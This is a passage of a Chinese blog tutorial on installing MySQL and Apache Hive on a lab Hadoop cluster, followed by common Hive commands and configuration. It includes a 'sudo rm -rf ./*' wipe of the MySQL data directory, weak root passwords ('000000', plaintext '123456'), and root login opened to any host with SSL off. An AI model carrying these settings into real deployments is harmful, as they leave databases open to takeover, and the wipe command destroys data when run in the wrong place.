mysql-community-libs-compat-5.7.28-1.el7.x86_64.rpm<span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> rpm -ivh mysql-community-client-5.7.28-1.el7.x86_64.rpm<span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> rpm -ivh mysql-community-server-5.7.28-1.el7.x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意:按照顺序依次执行</p><p>如果Linux是最小化安装的，在安装mysql-community-server-5.7.28-1.el7.x86_64.rpm时可能会出    现如下错误</p><p>[molly@hadoop102 software]$ sudo rpm -ivh mysql-community-server-5.7.28-1.el7.x86_64.rpm</p><p>警告：mysql-community-server-5.7.28-1.el7.x86_64.rpm: 头V3 DSA/SHA1 Signature, 密钥 ID 5072e1f5: NOKEY</p><p>错误：依赖检测失败：</p><p>​    libaio.so.1()(64bit) 被 mysql-community-server-5.7.28-1.el7.x86_64 需要</p><p>​    libaio.so.1(LIBAIO_0.1)(64bit) 被 mysql-community-server-5.7.28-1.el7.x86_64 需要</p><p>​    libaio.so.1(LIBAIO_0.4)(64bit) 被 mysql-community-server-5.7.28-1.el7.x86_64 需要</p><p>通过yum安装缺少的依赖,然后重新安装mysql-community-server-5.7.28-1.el7.x86_64 即可</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span> yum <span class="token function">install</span> -y libaio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）删除/etc/my.cnf文件中datadir指向的目录下的所有内容,如果有内容的情况下:</p><p>  查看datadir的值：</p><p>[mysqld]</p><p>datadir=/var/lib/mysql</p><p>  删除/var/lib/mysql目录下的所有内容:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mysql<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd /var/lib/mysql</span><span class="token punctuation">[</span>molly@hadoop102 mysql<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo rm -rf ./*  //注意执行命令的位置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>6）初始化数据库</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 opt<span class="token punctuation">]</span>$ <span class="token function">sudo</span> mysqld --initialize --user<span class="token operator">=</span>mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7）查看临时生成的root用户的密码 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 opt<span class="token punctuation">]</span>$ <span class="token function">cat</span> /var/log/mysqld.log <span class="token operator">|</span><span class="token function">grep</span> password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8）启动MySQL服务</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 opt<span class="token punctuation">]</span>$ <span class="token function">sudo</span> systemctl start mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>9）登录MySQL数据库</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 opt<span class="token punctuation">]</span>$ mysql -uroot -pEnter password:  输入临时生成的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  登录成功.</p><p>10）必须先修改root用户的密码,否则执行其他的操作会报错</p><pre class="line-numbers language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">set</span> password <span class="token operator">=</span> password<span class="token punctuation">(</span><span class="token string">"000000"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>11）修改mysql库下的user表中的root用户允许任意ip连接</p><pre class="line-numbers language-bash"><code class="language-bash">mysql<span class="token operator">></span> update mysql.user <span class="token keyword">set</span> host<span class="token operator">=</span><span class="token string">'%'</span> where user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span>mysql<span class="token operator">></span> flush privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-3-Hive安装部署"><a href="#2-3-Hive安装部署" class="headerlink" title="2.3 Hive安装部署"></a>2.3 Hive安装部署</h2><p>1）把apache-hive-3.1.2-bin.tar.gz上传到linux的/opt/software目录下</p><p>2）解压apache-hive-3.1.2-bin.tar.gz到/opt/module/目录下面</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf /opt/software/apache-hive-3.1.2-bin.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）修改apache-hive-3.1.2-bin.tar.gz的名称为hive</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">mv</span> /opt/module/apache-hive-3.1.2-bin/ /opt/module/hive-3.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）修改/etc/profile.d/my_env.sh，添加环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/profile.d/my_env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）添加内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#HIVE_HOME</span>HIVE_HOME<span class="token operator">=</span>/opt/module/hive-3.1.2PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token variable">$HADOOP_HOME</span>/bin:<span class="token variable">$HADOOP_HOME</span>/sbin:<span class="token variable">$HIVE_HOME</span>/bin<span class="token function">export</span> PATH JAVA_HOME HADOOP_HOME HIVE_HOME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>6）解决日志Jar包冲突:Hive日志与Hadoop默认日志冲突，可以直接删除hive日志JAR</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">rm</span> -rf /opt/module/hive-3.1.2/lib/log4j-slf4j-impl-2.10.0.jar <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-4-Hive元数据配置到MySql"><a href="#2-4-Hive元数据配置到MySql" class="headerlink" title="2.4 Hive元数据配置到MySql"></a>2.4 Hive元数据配置到MySql</h2><p>因为Hive默认使用的元数据库为derby，为了想多窗口操作，我们需要将Hive的元数据地址改为MySQL。下面安装好mysql后，进行将Hive元数据配置到mysql上。其中HIVE_HOME=/opt/module/hive-3.1.2</p><h3 id="2-4-1-拷贝驱动"><a href="#2-4-1-拷贝驱动" class="headerlink" title="2.4.1 拷贝驱动"></a>2.4.1 拷贝驱动</h3><p>将MySQL的JDBC驱动拷贝到Hive的lib目录下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">cp</span> /opt/software/mysql-connector-java-5.1.48.jar <span class="token variable">$HIVE_HOME</span>/lib<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-4-2-配置Metastore到MySql"><a href="#2-4-2-配置Metastore到MySql" class="headerlink" title="2.4.2 配置Metastore到MySql"></a>2.4.2 配置Metastore到MySql</h3><p>在$HIVE_HOME/conf目录下新建hive-site.xml文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ vim <span class="token variable">$HIVE_HOME</span>/conf/hive-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- jdbc连接的URL --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>javax.jdo.option.ConnectionURL<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>jdbc:mysql://hadoop102:3306/metastore?useSSL=false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- jdbc连接的Driver--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>javax.jdo.option.ConnectionDriverName<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>com.mysql.jdbc.Driver<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- jdbc连接的username--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>javax.jdo.option.ConnectionUserName<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- jdbc连接的password --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>javax.jdo.option.ConnectionPassword<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- Hive默认在HDFS的工作目录 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.metastore.warehouse.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>/user/hive/warehouse<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- Hive元数据存储的验证 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.metastore.schema.verification<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 元数据存储授权 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.metastore.event.db.notification.api.auth<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-5-启动Hive"><a href="#2-5-启动Hive" class="headerlink" title="2.5 启动Hive"></a>2.5 启动Hive</h2><h3 id="2-5-1-初始化元数据库"><a href="#2-5-1-初始化元数据库" class="headerlink" title="2.5.1 初始化元数据库"></a>2.5.1 初始化元数据库</h3><p>1）登陆MySQL</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ mysql -uroot -p000000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）新建Hive元数据库</p><pre class="line-numbers language-bash"><code class="language-bash">mysql<span class="token operator">></span> create database metastore<span class="token punctuation">;</span>mysql<span class="token operator">></span> quit<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3）初始化Hive元数据库</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ schematool -initSchema -dbType mysql -verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-5-2-启动Hive"><a href="#2-5-2-启动Hive" class="headerlink" title="2.5.2 启动Hive"></a>2.5.2 启动Hive</h3><p>0）先启动hadoop集群</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ start-dfs.sh<span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ start-yarn.sh<span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ myjps.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 浏览器中查看hdfs：<a href="http://hadoop102:9870/">http://Hadoop102:9870</a></p><p>浏览器中查看yarn ：<a href="http://hadoop103:8088/">http://Hadoop103:8088</a></p><p>1）启动Hive</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）使用Hive</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> show databases<span class="token punctuation">;</span>hive<span class="token operator">></span> show tables<span class="token punctuation">;</span>hive<span class="token operator">></span> create table <span class="token function">test</span> <span class="token punctuation">(</span>id int<span class="token punctuation">)</span><span class="token punctuation">;</span>hive<span class="token operator">></span> insert into <span class="token function">test</span> values<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>hive<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-5-3-使用元数据服务的方式访问Hive"><a href="#2-5-3-使用元数据服务的方式访问Hive" class="headerlink" title="2.5.3 使用元数据服务的方式访问Hive"></a>2.5.3 使用元数据服务的方式访问Hive</h3><p>原始方法：Hive直接访问mysql</p><p><strong>使用元数据服务方式：Hive—》元数据服务，元数据服务—》访问mysql。</strong></p><p>1）在hive-site.xml文件中添加如下配置信息</p><pre class="line-numbers language-xml"><code class="language-xml">  <span class="token comment" spellcheck="true">&lt;!-- 指定存储元数据要连接的地址 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.metastore.uris<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>thrift://hadoop102:9083<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）启动metastore</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop202 hive<span class="token punctuation">]</span>$ hive --service metastore2020-04-24 16:58:08: Starting Hive Metastore Server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意: 启动后窗口不能再操作，需打开一个新的shell窗口做别的操作</p><p>3）启动 hive</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop202 hive<span class="token punctuation">]</span>$ bin/hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-5-4-使用JDBC方式访问Hive"><a href="#2-5-4-使用JDBC方式访问Hive" class="headerlink" title="2.5.4 使用JDBC方式访问Hive"></a>2.5.4 使用JDBC方式访问Hive</h3><p><strong>客户端是beeline（JDBC协议去访问）;</strong></p><p><strong>服务端：Hive使用hiveserver2提供JDBC协议：</strong></p><p><strong>所以访问数据流是：blleline通过hiveserver2去访问Hive。</strong></p><p>1）在hive-site.xml文件中添加如下配置信息</p><p> 2）启动hiveserver2</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hive --service hiveserver2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）启动beeline客户端（需要多等待一会）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/beeline -u jdbc:hive2://hadoop102:10000 -n molly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）看到如下界面</p><pre class="line-numbers language-bash"><code class="language-bash">Connecting to jdbc:hive2://hadoop102:10000Connected to: Apache Hive <span class="token punctuation">(</span>version 3.1.2<span class="token punctuation">)</span>Driver: Hive JDBC <span class="token punctuation">(</span>version 3.1.2<span class="token punctuation">)</span>Transaction isolation: TRANSACTION_REPEATABLE_READBeeline version 3.1.2 by Apache Hive0: jdbc:hive2://hadoop102:10000<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-常用命令"><a href="#3-常用命令" class="headerlink" title="3 常用命令"></a>3 常用命令</h1><h2 id="3-1-Hive常用交互命令"><a href="#3-1-Hive常用交互命令" class="headerlink" title="3.1 Hive常用交互命令"></a>3.1 Hive常用交互命令</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hive -help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1）“-e”不进入hive的交互窗口执行sql语句</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hive -e <span class="token string">"select id from student;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）“-f”执行脚本中sql语句</p><p>（1）在/opt/module/hive/下创建datas目录并在datas目录下创建hivef.sql文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span>$ <span class="token function">touch</span> hivef.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）文件中写入正确的sql语句</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> *from student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）执行文件中的sql语句</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hive -f /opt/module/hive/datas/hivef.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）执行文件中的sql语句并将结果写入文件中</p><pre><code>[molly@hadoop102 hive]$ bin/hive -f /opt/module/hive/datas/hivef.sql &gt; /opt/module/datas/hive_result.txt</code></pre><h2 id="3-2-Hive其他命令操作"><a href="#3-2-Hive其他命令操作" class="headerlink" title="3.2 Hive其他命令操作"></a>3.2 Hive其他命令操作</h2><p>1）退出hive窗口：</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>exit<span class="token punctuation">;</span>hive<span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>quit<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在新版的hive中没区别了，在以前的版本是有的：</p><p>exit:先隐性提交数据，再退出；</p><p>quit:不提交数据，退出；</p><p>2）在hive cli命令窗口中如何查看hdfs文件系统</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>dfs -ls /<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）查看在hive中输入的所有历史命令</p><p>（1）进入到当前用户的根目录/root或/home/molly</p><p>（2）查看. hivehistory文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>atguig2u@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> .hivehistory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-Hive常见属性配置"><a href="#3-3-Hive常见属性配置" class="headerlink" title="3.3 Hive常见属性配置"></a>3.3 Hive常见属性配置</h2><h3 id="3-3-1-hive窗口打印默认库和表头"><a href="#3-3-1-hive窗口打印默认库和表头" class="headerlink" title="3.3.1 hive窗口打印默认库和表头"></a>3.3.1 hive窗口打印默认库和表头</h3><p>1）打印 当前库 和 表头</p><p>在hive-site.xml中加入如下两个配置: </p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.cli.print.header<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.cli.print.current.db<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-2-Hive运行日志信息配置"><a href="#3-3-2-Hive运行日志信息配置" class="headerlink" title="3.3.2 Hive运行日志信息配置"></a>3.3.2 Hive运行日志信息配置</h3><p>1）Hive的log默认存放在/tmp/molly/hive.log目录下（当前用户名下）</p><p>2）修改hive的log存放日志到/opt/module/hive/logs</p><p>（1）修改/opt/module/hive/conf/hive-log4j2.properties.template文件名称为</p><p>hive-log4j2.properties</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ <span class="token function">pwd</span>/opt/module/hive/conf<span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ <span class="token function">mv</span> hive-log4j2.properties.template hive-log4j2.properties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）在hive-log4j.properties文件中修改log存放位置</p><p>property.hive.log.dir=/opt/module/hive/logs</p><h3 id="3-3-3-参数配置方式"><a href="#3-3-3-参数配置方式" class="headerlink" title="3.3.3 参数配置方式"></a>3.3.3 参数配置方式</h3><p>1）查看当前所有的配置信息</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span>set<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）参数的配置三种方式</p><p>（1）配置文件方式</p><p>默认配置文件：hive-default.xml </p><p>用户自定义配置文件：hive-site.xml</p><p>注意：用户自定义配置会覆盖默认配置。另外，Hive也会读入Hadoop的配置，因为Hive是作为Hadoop的客户端启动的，Hive的配置会覆盖Hadoop的配置。配置文件的设定对本机启动的所有Hive进程都有效。</p><p>（2）命令行参数方式</p><p>启动Hive时，可以在命令行添加-hiveconf param=value来设定参数。</p><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop103 hive<span class="token punctuation">]</span>$ bin/hive -hiveconf mapred.reduce.tasks<span class="token operator">=</span>10<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：仅对本次hive启动有效</p><p>查看参数设置：  </p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapred.reduce.tasks<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）参数声明方式</p><p>可以在HQL中使用SET关键字设定参数</p><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapred.reduce.tasks<span class="token operator">=</span>100<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：仅对本次hive启动有效。</p><p>查看参数设置</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapred.reduce.tasks<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述三种设定方式的优先级依次递增。即配置文件&lt;命令行参数&lt;参数声明。注意某些系统级的参数，例如log4j相关的设定，必须用前两种方式设定，因为那些参数的读取在会话建立以前已经完成了。</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hive/">Hive</category>
      
      
      <comments>https://m01ly.github.io/2020/11/14/bigdata-hive1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hadoop 教程（二）安装hadoop集群-完全分布式部署</title>
      <link>https://m01ly.github.io/2020/11/12/bigdata-hdfs1/</link>
      <guid>https://m01ly.github.io/2020/11/12/bigdata-hdfs1/</guid>
      <pubDate>Thu, 12 Nov 2020 08:50:28 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
